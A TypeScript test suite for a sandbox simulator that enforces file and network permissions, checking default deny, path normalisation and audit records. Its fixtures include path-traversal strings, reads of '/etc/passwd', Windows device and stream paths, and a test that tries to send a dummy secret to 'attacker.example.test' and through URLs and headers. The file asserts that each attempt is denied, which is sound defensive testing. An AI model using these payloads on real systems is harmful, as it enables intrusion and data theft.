import assert from 'node:assert/strict';
import test from 'node:test';
import { Simulator } from '../src/simulator.ts';

const secret = 'DUMMY_SECRET_NEVER_REAL';
const url = 'https://api.example.test/health';
const make = () => new Simulator(
  { read: ['docs/', 'out/'], write: ['out/'], network: [url] },
  { 'docs/public.txt': 'DUMMY_PUBLIC', 'private/secret.txt': secret, 'out/existing.txt': 'DUMMY_OLD' },
);

test('default deny covers all action types', () => {
  const sim = new Simulator({}, { 'data.txt': secret });
  for (const action of [
    { type: 'read', path: 'data.txt' },
    { type: 'write', path: 'data.txt', data: 'DUMMY_NEW' },
    { type: 'network', url },
  ]) assert.equal(sim.execute(action).audit.decision, 'deny');
  assert.equal(new Simulator().execute({ type: 'network', url }).audit.decision, 'deny');
});

test('authorized reads, writes, GET and HEAD succeed', () => {
  const sim = make();
  assert.equal(sim.execute({ type: 'read', path: 'docs/public.txt' }).data, 'DUMMY_PUBLIC');
  assert.equal(sim.execute({ type: 'write', path: 'out/new.txt', data: 'DUMMY_NEW' }).audit.decision, 'allow');
  assert.equal(sim.execute({ type: 'read', path: 'out/new.txt' }).data, 'DUMMY_NEW');
  assert.equal(sim.execute({ type: 'write', path: 'out/new.txt', data: '' }).audit.decision, 'allow');
  assert.equal(sim.execute({ type: 'read', path: 'out/new.txt' }).data, '');
  for (const method of ['GET', 'HEAD']) assert.equal(sim.execute({ type: 'network', url, method }).status, 204);
});

test('unauthorized access and denied writes do not expose or change data', () => {
  const sim = new Simulator({ read: ['out/'] }, { 'out/existing.txt': 'DUMMY_OLD' });
  assert.equal(sim.execute({ type: 'write', path: 'out/existing.txt', data: secret }).audit.decision, 'deny');
  assert.equal(sim.execute({ type: 'read', path: 'out/existing.txt' }).data, 'DUMMY_OLD');
  assert.equal(sim.execute({ type: 'write', path: 'out/new.txt', data: secret }).audit.decision, 'deny');
  assert.equal(sim.execute({ type: 'read', path: 'out/new.txt' }).audit.reason, 'missing-file');
  const denied = make().execute({ type: 'read', path: 'private/secret.txt' });
  assert.equal(denied.audit.reason, 'not-granted');
  assert.equal(Object.hasOwn(denied, 'data'), false);
});

test('file grants are exact and directory grants respect segment boundaries', () => {
  const sim = new Simulator({ read: ['docs/public.txt', 'out/'] }, {
    'docs/public.txt.bak': secret, 'outside/file.txt': secret, 'out/file.txt': 'DUMMY_OK',
  });
  for (const path of ['docs/public.txt.bak', 'outside/file.txt', 'out']) {
    assert.equal(sim.execute({ type: 'read', path }).audit.reason, 'not-granted');
  }
  assert.equal(sim.execute({ type: 'read', path: 'out/file.txt' }).data, 'DUMMY_OK');
});

const invalidPaths = [
  '../private/secret.txt', 'docs/../private/secret.txt', 'docs\\..\\private\\secret.txt',
  'docs/..\\private/secret.txt', './docs/public.txt', 'docs/./public.txt',
  '/etc/passwd', '\\private\\secret.txt', 'C:\\private\\secret.txt', 'C:/private/secret.txt',
  'C:private.txt', '\\\\server\\share\\secret.txt', '//server/share/secret.txt',
  '\\\\?\\C:\\secret.txt', '\\\\.\\C:\\secret.txt', '\\??\\C:\\secret.txt',
  'docs/public.txt:secret', 'docs/public.txt::$DATA', 'docs/public.txt.', 'docs/public.txt ',
  'docs /public.txt', 'docs./public.txt', 'docs//public.txt', 'docs/public.txt/',
  'docs/%2e%2e/private.txt', 'docs/%252e%252e/private.txt', 'docs/..%5cprivate.txt',
  'docs/CON', 'docs/con.txt', 'docs/CON .txt', 'docs/NUL.txt', 'docs/aux', 'docs/PRN', 'docs/COM1.txt',
  'docs/LPT9', 'docs/COM0', 'docs/LPT1.txt', 'docs/COM¹', 'docs/public\u0000.txt',
  'docs/public\n.txt', 'docs/∕private.txt', 'docs/．．/private.txt', 'docs/*', 'docs/a?',
  '', ' ', 'docs/' + 'a'.repeat(256), 'a/'.repeat(600) + 'b',
];
for (const path of invalidPaths) {
  test(`reject unsafe path ${JSON.stringify(path).slice(0, 100)}`, () => {
    const sim = make();
    for (const type of ['read', 'write']) {
      const action = type === 'read' ? { type, path } : { type, path, data: secret };
      assert.equal(sim.execute(action).audit.reason, 'invalid-path');
    }
  });
}

test('portable paths normalize Windows separators and case consistently', () => {
  const sim = make();
  assert.equal(sim.execute({ type: 'read', path: 'DOCS\\PUBLIC.TXT' }).data, 'DUMMY_PUBLIC');
  sim.execute({ type: 'write', path: 'OUT\\EXISTING.TXT', data: 'DUMMY_CHANGED' });
  assert.equal(sim.execute({ type: 'read', path: 'out/existing.txt' }).data, 'DUMMY_CHANGED');
  assert.throws(() => new Simulator({}, { 'A.txt': 'a', 'a.TXT': 'b' }), /Invalid files/);
});

test('malformed policy and seed data fail closed', () => {
  for (const policy of [null, [], true, { read: '*' }, { read: [null] }, { read: ['/'] },
    { read: ['../'] }, { write: ['C:/'] }, { network: ['*'] }, { reads: ['docs/'] },
    { network: ['https://api.example.test/?secret=x'] }, JSON.parse('{"__proto__":{}}')]) {
    assert.throws(() => new Simulator(policy), /Invalid policy/);
  }
  for (const files of [null, [], { '../secret': secret }, { 'docs/a': 123 }]) {
    assert.throws(() => new Simulator({}, files), /Invalid files/);
  }
});

test('malformed and unknown actions deny and are logged', () => {
  const sim = make();
  const inputs = [null, [], false, {}, { type: 'shell' }, { type: 'read' },
    { type: 'write', path: 'out/a', data: 42 }, { type: 'read', path: 'docs/public.txt', extra: true },
    { type: 'network', url, method: null }, JSON.parse('{"type":"read","__proto__":{},"path":"docs/public.txt"}')];
  for (const input of inputs) assert.equal(sim.execute(input).audit.decision, 'deny');
  assert.equal(sim.audit.length, inputs.length);
});

test('exact endpoints reject alternate hosts, ports, paths and ambiguous URLs', () => {
  for (const target of [
    'https://evil.example.test/health', 'https://api.example.test.evil.test/health',
    'https://api.example.test:444/health', 'https://api.example.test/other',
    'https://api.example.test/health/' + secret, 'http://api.example.test/health',
    'file:///secret', 'https://127.0.0.1/health', 'https://[::1]/health',
    'https://api.example.test/a/../health', 'https://api.example.test/%68ealth',
    'https://api.example.test:443/health', ' https://api.example.test/health',
    'https://API.EXAMPLE.TEST/health', 'https://api.example.test\\health',
  ]) assert.equal(make().execute({ type: 'network', url: target }).audit.decision, 'deny', target);
});

test('read dummy secrets then attempt outbound exfiltration through every input channel', () => {
  const sim = new Simulator({ read: ['private/'], network: [url] }, { 'private/secret.txt': secret });
  const data = sim.execute({ type: 'read', path: 'private/secret.txt' }).data;
  assert.equal(data, secret);
  for (const action of [
    { type: 'network', url, body: data }, { type: 'network', url, data },
    { type: 'network', url, method: 'POST', body: data },
    { type: 'network', url, headers: { Authorization: data } },
    { type: 'network', url: url + '?data=' + data }, { type: 'network', url: url + '#' + data },
    { type: 'network', url: `https://${data}@api.example.test/health` },
    { type: 'network', url: `https://${data}.example.test/health` },
    { type: 'network', url: url + '/' + data },
    { type: 'network', url: 'https://attacker.example.test/collect', body: data },
  ]) assert.equal(sim.execute(action).audit.decision, 'deny');
  assert.equal(JSON.stringify(sim.audit).includes(secret), false);
});

test('audit records are deterministic, immutable and contain no untrusted text', () => {
  const sim = make();
  const first = sim.execute({ type: 'read', path: 'docs/public.txt' });
  sim.execute({ type: secret, path: secret });
  assert.deepEqual(sim.audit, [
    { sequence: 1, action: 'read', decision: 'allow', reason: 'authorized' },
    { sequence: 2, action: 'unknown', decision: 'deny', reason: 'invalid-action' },
  ]);
  assert.throws(() => { (first.audit as { decision: string }).decision = 'deny'; }, TypeError);
  const copy = sim.audit as unknown[];
  copy.length = 0;
  assert.equal(sim.audit.length, 2);
});

test('caller mutations cannot expand the installed policy', () => {
  const policy = { read: ['docs/'], network: [url] };
  const sim = new Simulator(policy, { 'private/secret.txt': secret });
  policy.read.push('private/');
  policy.network.push('https://evil.example.test/');
  assert.equal(sim.execute({ type: 'read', path: 'private/secret.txt' }).audit.decision, 'deny');
  assert.equal(sim.execute({ type: 'network', url: 'https://evil.example.test/' }).audit.decision, 'deny');
});
